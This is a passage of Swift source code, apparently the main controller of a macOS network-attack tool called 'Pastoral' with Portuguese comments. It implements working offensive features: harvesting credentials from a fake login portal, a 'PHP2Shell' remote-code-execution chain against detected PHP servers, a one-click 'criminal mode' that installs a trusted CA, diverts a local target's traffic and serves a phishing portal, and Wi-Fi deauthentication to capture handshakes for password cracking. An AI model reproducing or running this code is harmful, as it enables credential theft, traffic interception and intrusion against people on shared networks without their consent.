        if harvested.count > 1000 {
            harvested.removeLast(harvested.count - 1000)
        }
        // Append-only on disk; rebuild the file if it grew past the cap.
        do {
            if let handle = try? FileHandle(forWritingTo: Self.harvestFileURL) {
                try handle.seekToEnd()
                _ = try? handle.write(try LineCodec.encode(cred))
                try? handle.close()
            } else {
                let dir = Self.harvestFileURL.deletingLastPathComponent()
                try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
                try LineCodec.encode(cred).write(to: Self.harvestFileURL)
            }
            log.info("colheita: credencial de \(cred.sourceIP) — \(cred.page) (\(cred.user))")
        } catch {
            log.error("colheita: falha ao gravar harvest.jsonl — \(error.localizedDescription)")
        }
    }

    func clearHarvest() {
        harvested.removeAll()
        try? FileManager.default.removeItem(at: Self.harvestFileURL)
    }

    var harvestSummaryText: String {
        harvested.map(\.summary).joined(separator: "\n")
    }

    // MARK: PHP2Shell (CVE-2026-109618 / CVE-2026-109619)

    var phpTargets: [PhpTarget] = []
    var phpBusyIDs: Set<String> = []
    var phpNewTargetText = ""
    var phpIntensity: PhpOOMIntensity = .medium

    private func phpTarget(_ id: String) -> PhpTarget? {
        phpTargets.first { $0.id == id }
    }

    private func setPhpTarget(_ t: PhpTarget) {
        guard let i = phpTargets.firstIndex(where: { $0.id == t.id }) else { return }
        phpTargets[i] = t
    }

    /// Detecção passiva: toda resposta cujo headers anunciem PHP vira
    /// alvo automaticamente (cap 200). Chamado a cada troca capturada.
    func observePhpFingerprint(_ ex: CapturedExchange) {
        guard !ex.host.isEmpty,
              let fp = PhpFingerprint(headers: ex.responseHeaders) else { return }
        let port = ex.isTLS ? 443 : 80
        let id = "\(ex.host):\(port)"
        if phpTargets.count < 200,
           let i = phpTargets.firstIndex(where: { $0.id == id }) {
            if phpTargets[i].phpVersionText == nil {
                phpTargets[i].phpVersionText = fp.version.text
                phpTargets[i].versionSource = fp.source
            }
            return
        }
        guard phpTargets.count < 200 else { return }
        phpTargets.insert(PhpTarget(host: ex.host, port: port, basePath: "/",
                                    phpVersionText: fp.version.text,
                                    versionSource: fp.source, passive: true), at: 0)
        log.info("php2shell: alvo passivo \(id) — PHP \(fp.version.text) (header \(fp.source))")
    }

    /// Adiciona alvo manual a partir de "ip ou host[:porta][/caminho]".
    @discardableResult
    func addPhpTarget() -> Bool {
        var text = phpNewTargetText.trimmingCharacters(in: .whitespaces)
        guard !text.isEmpty else { return false }
        var path = "/"
        if let s = text.firstIndex(of: "/") {
            path = String(text[text.index(after: s)...])
            text = String(text[..<s])
        }
        var port = 80
        if let c = text.lastIndex(of: ":"),
           let p = Int(text[text.index(after: c)...]), p > 0 {
            port = p
            text = String(text[..<c])
        }
        let host = text
        guard !host.isEmpty else {
            lastError = "PHP2Shell: endereço inválido (use ip ou host[:porta][/caminho])"
            return false
        }
        let t = PhpTarget(host: host, port: port, basePath: path)
        if let i = phpTargets.firstIndex(where: { $0.id == t.id }) {
            phpTargets[i].basePath = path   // re-adicionado: só atualiza o path
        } else {
            phpTargets.insert(t, at: 0)
        }
        phpNewTargetText = ""
        log.info("php2shell: alvo manual \(t.id)\(path)")
        return true
    }

    func removePhpTarget(_ id: String) {
        phpTargets.removeAll { $0.id == id }
        phpBusyIDs.remove(id)
        log.info("php2shell: alvo removido \(id)")
    }

    /// Edita um campo de texto do alvo (bindings do tab PHP).
    func updatePhpTarget(_ id: String, _ mutate: (inout PhpTarget) -> Void) {
        guard let i = phpTargets.firstIndex(where: { $0.id == id }) else { return }
        mutate(&phpTargets[i])
    }

    /// Dispara o probe (baseline → header-bomb → nested-bomb → upload)
    /// em background; o relatório e, se houver, a memória vazada, caem
    /// na UI e na Colheita.
    func probePhp(targetID: String) {
        guard let t = phpTarget(targetID), !phpBusyIDs.contains(t.id) else { return }
        phpBusyIDs.insert(t.id)
        let (host, port, path, intensity, id) =
            (t.host, t.port, t.basePath, phpIntensity, t.id)
        Task.detached(priority: .userInitiated) { [weak self] in
            let report = PhpProbe.probe(host: host, port: port,
                                        path: path, intensity: intensity)
            await self?.applyPhpProbe(report, targetID: id)
        }
    }

    private func applyPhpProbe(_ report: PhpProbeReport, targetID: String) {
        guard var t = phpTarget(targetID) else { return }
        t.report = report
        setPhpTarget(t)
        phpBusyIDs.remove(t.id)
        log.info("php2shell: \(t.id) — \(report.summary)")
        for line in report.detailLines { log.info("  · \(line)") }
        if let sample = report.disclosureSample {
            appendCapturedCredential(CapturedCredential(
                user: "PHP2Shell — memória vazada (\(report.disclosureBytes ?? 0) B)",
                pass: sample,
                ssid: "",
                sourceIP: t.id,
                page: "php2shell \(report.path)",
                timestamp: .now))
        }
    }

    /// Cadeia A de RCE: planta código no filename do upload e dispara o
    /// sink LFI contra o arquivo de sessão. Output cai na Colheita.
    func runPhpRCE(targetID: String) {
        guard let t = phpTarget(targetID), !phpBusyIDs.contains(t.id) else { return }
        guard !t.lfiBase.trimmingCharacters(in: .whitespaces).isEmpty else {
            lastError = "PHP2Shell: informe o caminho do sink LFI (ex.: /vuln.php?page=) antes do RCE"
            return
        }
        phpBusyIDs.insert(t.id)
        let (host, port, path, lfi, dir, cmd, id) =
            (t.host, t.port, t.basePath, t.lfiBase, t.sessionDir, t.command, t.id)
        Task.detached(priority: .userInitiated) { [weak self] in
            let res = PhpProbe.rce(host: host, port: port, path: path,
                                   lfiBase: lfi, sessionDir: dir, command: cmd)
            await self?.applyPhpRCE(res, targetID: id, command: cmd)
        }
    }

    private func applyPhpRCE(_ res: PhpProbe.RCEResult, targetID: String, command: String) {
        guard var t = phpTarget(targetID) else { return }
        t.rceOutput = res.confirmed ? (res.output ?? "")
            : (res.reached
                ? "alvo respondeu, mas o comando não executou — confira o sink LFI e o diretório de sessão"
                : "alvo inacessível por TCP")
        setPhpTarget(t)
        phpBusyIDs.remove(t.id)
        if res.confirmed, let out = res.output {
            appendCapturedCredential(CapturedCredential(
                user: "PHP2Shell — RCE: \(command)",
                pass: out,
                ssid: "",
                sourceIP: t.id,
                page: "php2shell (tentativa \(res.attemptsUsed))",
                timestamp: .now))
            log.info("php2shell: RCE confirmado em \(t.id) na tentativa \(res.attemptsUsed)")
        } else {
            log.warn("php2shell: RCE não confirmado em \(t.id) (\(t.rceOutput ?? "?"))")
        }
    }

    // MARK: One-click criminal mode

    /// Tudo num clique: scan se preciso → melhor alvo → CA confiável no
    /// Mac → rota forçada (divert) → proxy → portal de login ativo com a
    /// armadilha da CA. Devolve nil em sucesso ou a mensagem de erro.
    @discardableResult
    func criminalStrike() async -> String? {
        guard helper.responding else {
            return AppError(.helperMissing).description
        }
        if hosts.isEmpty {
            await scanARP()
        }
        guard let target = Self.autoTarget(from: hosts) else {
            return AppError(.invalidInput("Nenhum alvo na rede — verifique o Wi-Fi")).description
        }
        ensureCAManager()
        if caTrusted != true {
            if let err = await setCATrust(true) {
                log.warn("criminal: CA não instalada no Mac (\(err)) — portal segue sem espionagem TLS local")
            }
        }
        loboPortalStyle = .login
        loboWeapons = [.portal]
        loboTargetID = target.id
        await loboInvade()
        return sheepRunning ? nil : lastError ?? AppError(.proxyFailed("proxy não subiu")).description
    }

    // MARK: Wi-Fi caça-senha (password hunt)

    var wifiNets: [WiFiNet] = []
    var houndBusy = false
    var hcxLines: [String] = []
    @ObservationIgnored private var houndClient: HelperClient?

    var wifiCurrent: WiFiNet? {
        wifiNets.first { $0.current } ?? wifiNets.max(by: { ($0.signal ?? -999) < ($1.signal ?? -999) })
    }

    func scanWiFi() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            return
        }
        let client = HelperClient()
        do {
            let res = try await client.send(.wifiScan)
            switch res {
            case .wifiNetworks(let nets):
                wifiNets = nets
                if let cur = wifiCurrent {
                    proxy?.portalSSID = cur.ssid
                    network.ssid = cur.ssid
                }
                log.info("wifi: \(nets.count) rede(s) visível(is)")
            case .error(let msg):
                lastError = AppError(.helperCommandFailed(msg)).description
            default:
                break
            }
        } catch {
            lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
        }
    }

    /// Kick stations off the current AP so they re-associate and re-run
    /// the 4-way handshake while the hound listens. Broadcast + one
    /// deauth per known LAN host (their ARP MAC == their station MAC).
    func passwordHunt(seconds: Int = 60) async {
        guard helper.responding, !houndBusy else {
            if !helper.responding { lastError = AppError(.helperMissing).description }
            return
        }
        if wifiNets.isEmpty { await scanWiFi() }
        guard let cur = wifiCurrent, !cur.bssid.isEmpty else {
            lastError = "Conecte-se ao Wi-Fi que deseja caçar (rede atual não detectada)."
            return
        }
        let iface = network.interfaceName ?? helper.interface ?? "en0"
        let client = HelperClient()
        do {
            let ack = try await client.startHCXCapture(interface: iface,
                                                       essid: cur.ssid, bssid: cur.bssid,
                                                       seconds: seconds) { [weak self] cap in
                Task { @MainActor in self?.appendHcxLine(cap.hashcatLine) }
            }
            guard case .ok = ack else {
                if case .error(let msg) = ack { lastError = msg }
                return
            }
            houndClient = client
            houndBusy = true
            hcxLines.removeAll()
            // Let the BPF settle, then fire the deauth burst.
            try? await Task.sleep(nanoseconds: 700_000_000)
            let targets = observableHosts.map(\.mac) + ["ff:ff:ff:ff:ff:ff"]
            for mac in targets {
                await sendDeauth(targetMAC: mac, bssid: cur.bssid, channel: cur.channel ?? 6)
            }
            log.info("caça-senha: \(seconds)s em \(cur.ssid) (\(cur.bssid)) — \(targets.count) deauth(s)")
            try? await Task.sleep(nanoseconds: UInt64(seconds + 4) * 1_000_000_000)
            stopHound()
        } catch {
            lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
            stopHound()
        }
    }

    func stopHound() {
        Task { [weak self] in
            await self?.houndClient?.stopHCXCapture()
            self?.houndClient = nil
            self?.houndBusy = false
            self?.log.info("caça-senha: parada (\(self?.hcxLines.count ?? 0) linha(s))")
        }
    }

    private func appendHcxLine(_ line: String) {
        guard !hcxLines.contains(line) else { return }
        hcxLines.insert(line, at: 0)
        if hcxLines.count > 200 { hcxLines.removeLast(hcxLines.count - 200) }
        log.info("caça-senha: \(line.prefix(64))…")
    }

    func sendDeauth(targetMAC: String, bssid: String, channel: Int) async {
        let client = HelperClient()
        do {
            let res = try await client.send(.deauthSend(targetMAC: targetMAC, bssid: bssid, channel: channel))
            if case .error(let msg) = res {
                log.warn("deauth: \(msg)")
            }
        } catch {
            log.warn("deauth: \(error.localizedDescription)")
        }
    }

    private func addCapturedRequest(_ ex: CapturedExchange) {
        let req = CapturedRequest(from: ex)
        requests.insert(req, at: 0)
        capturedExchanges[ex.id] = ex
        // Keep the list bounded.
        if requests.count > 1000 {
            requests.removeLast(requests.count - 1000)
            // Prune the exchange cache to match.
            let keep = Set(requests.map(\.id))
            capturedExchanges = capturedExchanges.filter { keep.contains($0.key) }
        }
        // PHP2Shell: resposta que anuncia PHP vira alvo passivo.
        observePhpFingerprint(ex)
    }

    // MARK: - QUIC/HTTP3 passive sniffing (phase 2)

    /// Start passive QUIC sniffing on the default interface. Observations
    /// are appended to `quicObservations` on the main actor as they arrive.
    func startQUICSniffing() async {
        let iface = network.interfaceName ?? helper.interface ?? "en0"
        let client = HelperClient()
        do {
            let ack = try await client.startQUICCapture(interface: iface) { [weak self] obs in
                Task { @MainActor in
                    self?.appendQUICObservation(obs)
                }
            }
            if case .ok = ack {
                quicClient = client
                quicSniffing = true
                log.info("quic: sniffing on \(iface)")
            } else if case .error(let msg) = ack {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "quic: \(error)"
            log.error(lastError!)
        }
    }

    /// Stop passive QUIC sniffing.
    func stopQUICSniffing() async {
        await quicClient?.stopQUICCapture()
        quicClient = nil
        quicSniffing = false
        log.info("quic: sniffing stopped")
    }

    private func appendQUICObservation(_ obs: QUICObservation) {
        quicObservations.insert(obs, at: 0)
        if quicObservations.count > 500 {
            quicObservations.removeLast(quicObservations.count - 500)
        }
        // QUIC from a diverted/intercepted host while UDP/443 isn't
        // blocked → the flow is invisible to the TCP-only proxy.
        if diagnosticMode, sheepRunning, !forceTCPFallback {
            recordDiag(DiagEvent(
                clientIP: obs.sourceIP, sni: obs.sni,
                outcome: "quic_seen",
                detail: "QUIC/UDP443 visto sem bloqueio — tráfego h3 não interceptável",
                category: .quicInvisible))
        }
    }

    // MARK: - mDNS/LLMNR capture (phase 4)

    func startMDNSCapture() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("startMDNSCapture: helper offline")
            return
        }
        let client = HelperClient()
        do {
            let res = try await client.startMDNSCapture(interface: network.interfaceName ?? helper.interface ?? "en0") { [weak self] obs in
                Task { @MainActor in self?.appendMDNSObservation(obs) }
            }
            if case .ok(let msg) = res {
                mdnsClient = client
                mdnsSniffing = true
                log.info(msg ?? "mdns: captura iniciada")
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "mdns.start: \(error)"
            log.error(lastError!)
        }
    }

    func stopMDNSCapture() async {
        await mdnsClient?.stopMDNSCapture()
        mdnsClient = nil
        mdnsSniffing = false
        log.info("mdns: captura parada")
    }

    private func appendMDNSObservation(_ obs: MDNSObservation) {
        mdnsObservations.insert(obs, at: 0)
        if mdnsObservations.count > 500 {
            mdnsObservations.removeLast(mdnsObservations.count - 500)
        }
        classifyHosts()
    }

    // MARK: - Replay (phase 5)

    /// Replay a captured request with optional modifications. The request
    /// is sent directly to the origin (bypassing the MITM proxy) so the
    /// response is the real origin's response to the modified request.
    func replayRequest(_ exchange: CapturedExchange,
                       modifications: ReplayBuilder.Modifications = .init(),
                       host: String? = nil, port: UInt16? = nil,
                       useTLS: Bool? = nil) async {
        isReplaying = true
        defer { isReplaying = false }
        let client = ReplayClient()
        let result = await client.replay(exchange, modifications: modifications,
                                          host: host, port: port, useTLS: useTLS)
        lastReplayResult = result
        if let err = result.error {
            lastError = "replay: \(err)"
            log.error(lastError!)
        } else {
            log.info("replay: \(exchange.method) \(exchange.path) → \(result.status.map(String.init) ?? "?")")
        }
    }

    // MARK: - Tunnel (phase 6)

    /// Bring up a WireGuard tunnel with the given config text.
    func startTunnel(config: String) async {
        readiness = LocalReadiness.read()
        guard readiness.wireGuardAvailable else {
            lastError = "WireGuard indisponível: os componentes necessários não estão instalados no local esperado."
            return
        }
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("startTunnel: helper offline")
            return
        }
        let client = HelperClient()
        do {
            let res = try await client.send(.tunnelStart(config: config))
            if case .ok(let msg) = res {
                log.info(msg ?? "tunnel: up")
                await refreshTunnelStatus()
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "tunnel.start: \(error)"
            log.error(lastError!)
        }
    }

    /// Tear down the active WireGuard tunnel.
    func stopTunnel() async {
        guard helper.responding else { return }
        let client = HelperClient()
        do {
            let res = try await client.send(.tunnelStop)
            if case .ok(let msg) = res {
                log.info(msg ?? "tunnel: down")
                tunnelInterface = nil
                tunnelHandshake = nil
                tunnelRX = 0
                tunnelTX = 0
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "tunnel.stop: \(error)"
            log.error(lastError!)
        }
    }

    /// Bring up a Tailscale tunnel with the given config.
    func startTailscale(config: TailscaleConfig) async {
        readiness = LocalReadiness.read()
        guard readiness.tailscaleAvailable else {
            lastError = "Tailscale indisponível: o aplicativo não encontrou o componente necessário."
            return
        }
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("startTailscale: helper offline")
            return
        }
        let client = HelperClient()
        do {
            let res = try await client.send(.tailscaleUp(config: config))
            if case .ok(let msg) = res {
                log.info(msg ?? "tailscale: up")
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "tailscale.up: \(error)"
            log.error(lastError!)
        }
    }

    /// Disconnect Tailscale.
    func stopTailscale() async {
        guard helper.responding else { return }
        let client = HelperClient()
        do {
            let res = try await client.send(.tailscaleDown)
            if case .ok(let msg) = res {
                log.info(msg ?? "tailscale: down")
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "tailscale.down: \(error)"
            log.error(lastError!)
        }
    }

    /// Refresh tunnel status from the helper.
    func refreshTunnelStatus() async {
        guard helper.responding else { return }
        let client = HelperClient()
        do {
            let res = try await client.send(.tunnelStatus)
            if case .tunnelStatus(let iface, let hs, let rx, let tx) = res {
                tunnelInterface = iface
                tunnelHandshake = hs
                tunnelRX = rx
                tunnelTX = tx
            }
        } catch {
            // Silent — status refresh is best-effort.
        }
    }

    // MARK: - Selective Kill (phase 3)

    /// Apply a selective Kill policy to a host: drop or rate-limit traffic
    /// filtered by port/protocol/DSCP, instead of the default total drop.
    func applySelectivePolicy(_ policy: KillPolicy) async {
        let client = HelperClient()
        do {
            let res = try await client.send(.killSelective(policy: policy))
            if case .ok(let msg) = res {
                log.info(msg ?? "kill.selective aplicado")
                selectivePolicies[policy.targetIP] = policy
                updateDirtyState()
            } else if case .error(let msg) = res {
                lastError = msg
                log.error(msg)
            }
        } catch {
            lastError = "kill.selective: \(error)"
            log.error(lastError!)
        }
    }

    /// Clear selective Kill policies for a host.
    func clearSelectivePolicy(targetIP: String) async {
        do {
            let response = try await restoreRequest(.killSelectiveClear(targetIP: targetIP))
            guard case .ok = response else {
                lastError = "Não foi possível remover as políticas seletivas: \(response)"
                return
            }
            // Match the helper's actual operation; never leave phantom rules.
            selectivePolicies.removeAll()
            recoverySelectiveIPs.removeAll()
            updateDirtyState()
            log.info("Todas as políticas seletivas foram removidas pelo serviço.")
        } catch {
            lastError = "Não foi possível remover as políticas seletivas: \(error.localizedDescription)"
        }
    }

    // MARK: - Uninstall (step 7)

    func uninstall() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("uninstall: helper offline")
            return
        }
        let client = HelperClient()
        do {
            let res = try await client.send(.uninstall)
            if case .ok = res {
                log.info("Pastoral desinstalado")
                helper = .offline
                hosts = []
                requests = []
                sheepRunning = false
                killGlobal = false
            }
        } catch {
            lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
            log.error("uninstall: \(error.localizedDescription)")
        }
    }

    // MARK: - Export (step 5)

    func exportHAR() {
        let exchanges = requests.map { req in
            CapturedExchange(
                id: req.id, timestamp: req.timestamp,
                host: req.host, method: req.method, path: req.path,
                status: req.status, isTLS: req.isTLS, sni: req.sni
            )
        }
        guard let data = try? ExchangeExporter.exportHAR(exchanges) else {
            log.error("exportHAR: falhou")
            return
        }
        saveExport(data, suggestedName: "pastoral.har")
        log.info("exportHAR: \(exchanges.count) requisições")
    }

    func exportCSV() {
        let exchanges = requests.map { req in
            CapturedExchange(
                id: req.id, timestamp: req.timestamp,
                host: req.host, method: req.method, path: req.path,
                status: req.status, isTLS: req.isTLS, sni: req.sni
            )
        }
        let data = ExchangeExporter.exportCSV(exchanges)
        saveExport(data, suggestedName: "pastoral.csv")
        log.info("exportCSV: \(exchanges.count) requisições")
    }

    private func saveExport(_ data: Data, suggestedName: String) {
        let panel = NSSavePanel()
        panel.nameFieldStringValue = suggestedName
        if panel.runModal() == .OK, let url = panel.url {
            try? data.write(to: url)
        }
    }

    // MARK: - Derived helpers for the UI

    var killedCount: Int { hosts.filter { $0.isKilled }.count }
    var divertedCount: Int { hosts.filter { $0.isDiverted }.count }

    var filteredRequests: [CapturedRequest] {
        requests.filter { req in
            if let host = requestHostFilter, req.host != host { return false }
            if requestTextFilter.isEmpty { return true }
            let needle = requestTextFilter.lowercased()
            return req.host.lowercased().contains(needle)
                || req.path.lowercased().contains(needle)
                || req.method.lowercased().contains(needle)
        }
    }
}
